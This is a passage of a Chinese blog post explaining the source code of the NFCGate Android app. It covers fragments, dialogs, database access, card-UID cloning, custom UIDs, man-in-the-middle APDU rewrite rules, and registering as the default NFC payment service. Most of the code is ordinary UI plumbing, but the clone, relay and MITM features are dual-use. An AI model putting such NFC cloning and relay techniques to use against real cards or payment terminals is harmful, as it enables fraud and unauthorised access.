class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MulAdapter中设置此方法.</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initCheck</span><span class="params">(List&lt;NfcComm&gt; mlist)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mlist.size(); i++) &#123;</span><br><span class="line">        isSelected.put(i,mlist.get(i).isCheck());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NFCComm中设置此方法.</span></span><br><span class="line"><span class="comment">// checkbox getter and setter</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mCheck;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCheck</span><span class="params">(<span class="keyword">boolean</span> mCheck)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.mCheck = mCheck;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LoggingFragment中 ListItem 点击事件的响应, 设置CheckBox的状态</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onListItemClick</span><span class="params">(View v, <span class="keyword">int</span> pos, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// get ViewHolder Object</span></span><br><span class="line">    ViewHolder holder = (ViewHolder)v.getTag();</span><br><span class="line">    <span class="comment">// change checbox status</span></span><br><span class="line">    holder.cb.toggle();</span><br><span class="line">    <span class="comment">// save select state in mEvenList</span></span><br><span class="line">    mEventList.get(pos).setCheck(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// save checkbox selected status</span></span><br><span class="line">  MulAdapter.getIsSelected().put(pos,holder.cb.isChecked());</span><br><span class="line">    <span class="comment">// adjust selected item</span></span><br><span class="line">    <span class="keyword">if</span> (holder.cb.isChecked() == <span class="keyword">true</span>) &#123;</span><br><span class="line">        mCheckNum++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mCheckNum--;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(v.getContext(),<span class="string">"Already selected "</span> + mCheckNum</span><br><span class="line">                   + <span class="string">" item."</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fragment">Ⅱ. Fragment</h3><h4 id="clonefragment">1. CloneFragment</h4><p>这里的一些监听事件就不细讲, 挑一些重要的讲一下.</p><p><code>Fragment</code>与<code>Activity</code>是相辅相成的, 一个<code>Activity</code>可以有多个<code>Fragment</code>, 例如, 该项目中的<code>MainActivity</code>中调用了多个<code>Fragment</code>(具体调用及原理参阅<安卓编程权威指南>第10章), 而<code>Fragment</code>被调用的方式如下:</安卓编程权威指南></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CloneFragment的一个方法, 这个方法被其他class调用, 从而调用该Fragment</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CloneFragment <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(mFragment == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mFragment = <span class="keyword">new</span> CloneFragment();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mFragment;</span><br><span class="line">&#125;</span><br><span class="line">RelayFragment.getInstance();RelayFragment.getInstance();</span><br></pre></td></tr></table></figure><p>其中, 发现标签后, 会做如下写数据库操作:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CloneListStorage storage = <span class="keyword">new</span> CloneListStorage(mContext);</span><br><span class="line">                            storage.add(<span class="keyword">new</span> CloneListItem(RelayFragment.getInstance().mNfcManager.getAnticolData(), value.toString()));</span><br></pre></td></tr></table></figure><p>这里从<code>RelayFragment</code>中获取实例后, 再调用该实例里的<code>mNfcManager</code>实例的方法获得卡的UID. 随机UID的方法在接下来数据库操作那里解释.</p><h4 id="enablenfcdialog">2. EnablenfcDialog</h4><p>这个<code>Dialog</code>在NFC没开启的情况下, 会跳出该<code>Dialog</code>, 提示去系统设置里打开NFC.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在MainActivity中, 继承了EnableNFCDialog, 因此重载了该方法, 并调用了Settings</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNFCDialogPositiveClick</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// User touched the dialog's goto settings button</span></span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(Settings.ACTION_NFC_SETTINGS);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="hcefragment">4. HceFragment</h4><p>这个<code>Fragment</code>是第四个Tab, 也就是<code>Hce</code>下的视图界面代码, 值得关注的几点有:</p><ul><li><p>动态申请存储权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ActivityCompat.requestPermissions的方法能够调用申请的dialog</span></span><br><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt; Build.VERSION_CODES.LOLLIPOP) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        ActivityCompat.requestPermissions(getActivity(), PERMISSIONS_STORAGE, REQUEST_PERMISSION_CODE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>动态申请默认支付权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">NfcAdapter adapter = NfcAdapter.getDefaultAdapter(getContext());</span><br><span class="line"><span class="comment">// 通过上面实例化一个NFCAdapter之后, 成功获取了CardEmulation实例</span></span><br><span class="line">mCardEmulation = CardEmulation.getInstance(adapter);</span><br><span class="line"><span class="comment">// ComponentName输入的是对应的包名和类</span></span><br><span class="line">ComponentName myComponent = <span class="keyword">new</span> ComponentName(<span class="string">"tud.seemuh.nfcgate"</span>,<span class="string">"tud.seemuh.nfcgate.nfc.hce.ApduService"</span>);</span><br><span class="line"><span class="comment">// 调用CardEmulation的方法</span></span><br><span class="line"><span class="keyword">if</span> (!mCardEmulation.isDefaultServiceForCategory(myComponent, CardEmulation.CATEGORY_PAYMENT)) &#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent(CardEmulation.ACTION_CHANGE_DEFAULT);</span><br><span class="line">    intent.putExtra(CardEmulation.EXTRA_CATEGORY, CardEmulation.CATEGORY_PAYMENT);</span><br><span class="line">    intent.putExtra(CardEmulation.EXTRA_SERVICE_COMPONENT, myComponent);</span><br><span class="line">    startActivityForResult(intent, <span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Log.e(<span class="string">"MainActivityHost"</span>, <span class="string">"on Create: Already default!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>设置Spinner控件的Adapter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ArrayAdapter&lt;String&gt; listadapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(getContext(), android.R.layout.simple_spinner_dropdown_item,myFile);</span><br><span class="line">sp.setAdapter(listadapter);</span><br></pre></td></tr></table></figure></li></ul><h4 id="loggingdetailfragment">5. LoggingDetailFragment</h4><p>这个<code>Fragment</code>是布局Logging数据的视图, 算是一个比较复杂的<code>Fragment</code>了, 将会对如下特性作解释.</p><ul><li><p>AlertDialog</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> AlertDialog <span class="title">getRenameSessionDialog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    AlertDialog.Builder builder = <span class="keyword">new</span> AlertDialog.Builder(getActivity());</span><br><span class="line">    <span class="comment">// Add input value 给TextView添加原本来的Session</span></span><br><span class="line">    <span class="keyword">final</span> EditText input = <span class="keyword">new</span> EditText(getActivity());</span><br><span class="line">    <span class="keyword">if</span> (mSession.getName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        input.setText(mSession.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set up text</span></span><br><span class="line">    builder.setTitle(getText(R.string.title_dialog_rename))</span><br><span class="line">        .setMessage(getText(R.string.rename_dialog_text))</span><br><span class="line">        .setView(input)</span><br><span class="line">        .setIcon(R.drawable.ic_action_edit_title)</span><br><span class="line">        .setPositiveButton(getString(R.string.rename_dialog_confirm), <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialogInterface, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">                doSessionRename(input.getText().toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    builder.setNegativeButton(getString(R.string.rename_dialog_cancel), <span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> builder.create();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这算是一个比较经典的关于弹窗的案例了, <code>AlertDialog.Builder</code>实例化的对象有多种设置组件的方法, 如上面代码所示, 最后调用<code>getRenameSessionDialog.show()</code>即可弹窗.</p></li><li><p>AsyncTask</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">AsyncSessionLoader</span> <span class="keyword">extends</span> <span class="title">AsyncTask</span>&lt;<span class="title">Long</span>, <span class="title">Void</span>, <span class="title">Cursor</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String TAG = <span class="string">"AsyncSessionLoader"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase mDB;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写此方法以在后台线程上执行计算</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Cursor <span class="title">doInBackground</span><span class="params">(Long... longs)</span> </span>&#123;</span><br><span class="line">        Log.d(TAG, <span class="string">"doInBackground: Started"</span>);</span><br><span class="line">        <span class="comment">// Get a DB object</span></span><br><span class="line">        SessionLoggingDbHelper dbHelper = <span class="keyword">new</span> SessionLoggingDbHelper(getActivity());</span><br><span class="line">        mDB = dbHelper.getReadableDatabase();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Construct query</span></span><br><span class="line">        <span class="comment">// Define Projection</span></span><br><span class="line">        String[] projection = &#123;</span><br><span class="line">            SessionLoggingContract.SessionMeta._ID,</span><br><span class="line">            SessionLoggingContract.SessionMeta.COLUMN_NAME_NAME,</span><br><span class="line">            SessionLoggingContract.SessionMeta.COLUMN_NAME_DATE,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// Define Sort order</span></span><br><span class="line">        String sortorder = SessionLoggingContract.SessionMeta.COLUMN_NAME_DATE + <span class="string">" DESC"</span>;</span><br><span class="line">        <span class="comment">// Define Selection</span></span><br><span class="line">        String selection = SessionLoggingContract.SessionMeta._ID + <span class="string">" LIKE ?"</span>;</span><br><span class="line">        <span class="comment">// Define Selection Arguments</span></span><br><span class="line">        String[] selectionArgs = &#123;String.valueOf(longs[<span class="number">0</span>])&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Perform query</span></span><br><span class="line">        Log.d(TAG, <span class="string">"doInBackground: Performing query"</span>);</span><br><span class="line">        Cursor c = mDB.query(</span><br><span class="line">            SessionLoggingContract.SessionMeta.TABLE_NAME,  <span class="comment">// Target Table</span></span><br><span class="line">            projection,    <span class="comment">// Which fields are we interested in?</span></span><br><span class="line">            selection,     <span class="comment">// Selection clause</span></span><br><span class="line">            selectionArgs, <span class="comment">// Arguments to clause</span></span><br><span class="line">            <span class="keyword">null</span>,          <span class="comment">// Grouping (not desired in this case)</span></span><br><span class="line">            <span class="keyword">null</span>,          <span class="comment">// Filtering (not desired in this case)</span></span><br><span class="line">            sortorder      <span class="comment">// Sort order</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Log.d(TAG, <span class="string">"doInBackground: Query done, returning"</span>);</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">true&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 必须从应用程序的主线程调用此方法, 上面方法返回的cursor传入下面的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPostExecute</span><span class="params">(Cursor c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Move to the first element of the cursor</span></span><br><span class="line">        Log.d(TAG, <span class="string">"onPostExecute: Beginning processing of Sessions"</span>);</span><br><span class="line">        <span class="keyword">if</span> (!c.moveToFirst()) &#123;</span><br><span class="line">            Log.i(TAG, <span class="string">"onPostExecute: Cursor empty, doing nothing."</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// prepare session object</span></span><br><span class="line">        <span class="keyword">long</span> ID = c.getLong(c.getColumnIndexOrThrow(SessionLoggingContract.SessionMeta._ID));</span><br><span class="line">        String name = c.getString(c.getColumnIndexOrThrow(SessionLoggingContract.</span><br><span class="line">                                                          SessionMeta.COLUMN_NAME_NAME));</span><br><span class="line">        String date = c.getString(c.getColumnIndexOrThrow(SessionLoggingContract.</span><br><span class="line">                                                          SessionMeta.COLUMN_NAME_DATE));</span><br><span class="line">        NfcSession session = <span class="keyword">new</span> NfcSession(date, ID, name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update session information</span></span><br><span class="line">        setSessionDetails(session);</span><br><span class="line">        Log.d(TAG, <span class="string">"onPostExecute: Closing connection and finishing"</span>);</span><br><span class="line">        c.close();</span><br><span class="line">        mDB.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用了UI多线程<a href="https://developer.android.com/reference/android/os/AsyncTask" target="_blank" rel="noopener">AsyncTask</a>的方式从数据库中加载Session的Apdu数据.</p></li></ul><h4 id="loggingfragment">6. LoggingFragment</h4><p>这里的特性跟<code>loggingDetailFragment</code>的差不多, 是Session列表的视图界面, 具体分析不再展开.</p><h4 id="mitmfragment">7. MitmFragment</h4><p>在RelayFragment中可以跳到这个Fragment, 这里主要的操作也是数据库操作. 如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get data from user, then storage in database</span></span><br><span class="line"><span class="comment">// 这里需要注意的是, 因为调用了CustomTextWatcher, 每一个字节16进制字符串会有一个空格, 因此入库的时候要把空格删掉</span></span><br><span class="line">String name = etName.getText().toString();</span><br><span class="line">String reader = etReader.getText().toString().replace(<span class="string">" "</span>,<span class="string">""</span>);</span><br><span class="line">String card = etCard.getText().toString().replace(<span class="string">" "</span>,<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check input hex format</span></span><br><span class="line"><span class="keyword">if</span> (name.length() == <span class="number">0</span>) &#123;</span><br><span class="line">    Toast.makeText(getActivity(),<span class="string">"Please input command Function!"</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!Utils.isHex(mContext, reader) &amp;&amp; Utils.isHex(mContext, card)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// save in database</span></span><br><span class="line">RuleListItem ruleListItem = <span class="keyword">new</span> RuleListItem(</span><br><span class="line">    name,</span><br><span class="line">    <span class="keyword">new</span> NfcComm(NfcComm.Source.HCE,Utils.toBytes(reader)),</span><br><span class="line">    <span class="keyword">new</span> NfcComm(NfcComm.Source.CARD,Utils.toBytes(card))</span><br><span class="line">);</span><br><span class="line">RuleListStorage mRuleDb = <span class="keyword">new</span> RuleListStorage(mContext);</span><br><span class="line">mRuleDb.add(ruleListItem);</span><br><span class="line"></span><br><span class="line"><span class="comment">// add item list</span></span><br><span class="line">refreshList();</span><br><span class="line"></span><br><span class="line">mListAdapter.notifyDataSetChanged();</span><br><span class="line"><span class="comment">// success message show in activity</span></span><br><span class="line">Toast.makeText(getActivity(),<span class="string">"Save Successfully!"</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">dialog.dismiss();</span><br></pre></td></tr></table></figure><h4 id="relayfragment">8. RelayFragment</h4><p>这个Fragment应该是最重要的一个了. 一开始先实例化诸多空间和诸多类, 控制Nerwork/NFC/Database等. 下面将一些方法实现.</p><ol type="1"><li><p>checkIpPort</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// regex for IP checking</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String regexIPpattern =<span class="string">"^(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.)&#123;3&#125;([01]?\\d\\d?|2[0-4]\\d|25[0-5])$"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> maxPort = <span class="number">65535</span>;</span><br><span class="line">．．．</span><br><span class="line"><span class="comment">// 这个方法是检测IP和port的</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkIpPort</span><span class="params">(String ip, String port)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> validPort = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> gotException = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> validIp = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 实例化matcher以便根据正则确定是否是合法的IP</span></span><br><span class="line">    Pattern pattern = Pattern.compile(regexIPpattern);</span><br><span class="line">    Matcher matcher = pattern.matcher(ip);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> int_port = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        int_port = Integer.parseInt(port.trim());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">        gotException = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!gotException) &#123;</span><br><span class="line">    <span class="comment">// 若在端口范围内, 则validPort置为true</span></span><br><span class="line">        <span class="keyword">if</span> ((int_port &gt; <span class="number">0</span>) &amp;&amp; (int_port &lt;= maxPort)) validPort = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    validIp = matcher.matches();</span><br><span class="line">    <span class="keyword">if</span> (validPort) globalPort = int_port;</span><br><span class="line">    <span class="comment">// 只有port和ip都合法时才返回true</span></span><br><span class="line">    <span class="keyword">return</span> validPort &amp;&amp; validIp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>defineUID</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mFilterManager.rule.setAc(RuleMatching.MitMAction.SelfDefineAnticol);</span><br><span class="line"><span class="keyword">final</span> AlertDialog.Builder builder = <span class="keyword">new</span> AlertDialog.Builder(getContext());</span><br><span class="line"><span class="keyword">final</span> EditText input = <span class="keyword">new</span> EditText(getContext());</span><br><span class="line">input.addTextChangedListener(<span class="keyword">new</span> CustomTextWatcher(input));</span><br><span class="line">builder.setTitle(R.string.pref_define_uid_title)</span><br><span class="line">    .setCancelable(<span class="keyword">true</span>)</span><br><span class="line">    .setMessage(R.string.pref_define_uid_hex)</span><br><span class="line">    .setView(input)</span><br><span class="line">    .setPositiveButton(<span class="string">"Confirm"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">            String UID = input.getText().toString().replace(<span class="string">" "</span>,<span class="string">""</span>);</span><br><span class="line">            <span class="comment">// 检查UID的长度是不是4个字节</span></span><br><span class="line">            <span class="keyword">if</span>(!Utils.isHexAndByte(UID, getContext(),<span class="number">4</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果检查通过则调用Filtermanager里实例化的Rule, 这里对应的是RuleMatching</span></span><br><span class="line">            mFilterManager.rule.setUID(UID);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .setNegativeButton(<span class="string">"Cancel"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">builder.create();</span><br><span class="line">builder.show();</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>关于defineUID的有三种UID模式, 分别是: <code>RandomUID</code> <code>SelfDefineUID</code> <code>DefultUID</code>, 分别对应三个case, 上示代码是关于<code>selfdefineUID</code>的代码.</p></li><li><p>networkConnectCommon</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">networkConnectCommon</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Initialize SinkManager</span></span><br><span class="line">    mSinkManager = <span class="keyword">new</span> SinkManager(mSinkManagerQueue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize FilterManager</span></span><br><span class="line">    mFilterManager = <span class="keyword">new</span> FilterManager();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pass references</span></span><br><span class="line">    <span class="comment">// 用来存储Apdu数据</span></span><br><span class="line">    mNfcManager.setSinkManager(mSinkManager, mSinkManagerQueue);</span><br><span class="line">    <span class="comment">// 用来过滤Apdu数据</span></span><br><span class="line">    mNfcManager.setFilterManager(mFilterManager);</span><br><span class="line">    <span class="comment">// 用来HighLevelProtobufHandler</span></span><br><span class="line">    mNfcManager.setNetworkHandler(mConnectionClient);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FIXME For debugging purposes, hardcoded selecting of sinks happens here</span></span><br><span class="line">    <span class="comment">// This should be selectable by the user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize sinks</span></span><br><span class="line">    <span class="comment">// Get Preference manager to determine which sinks are 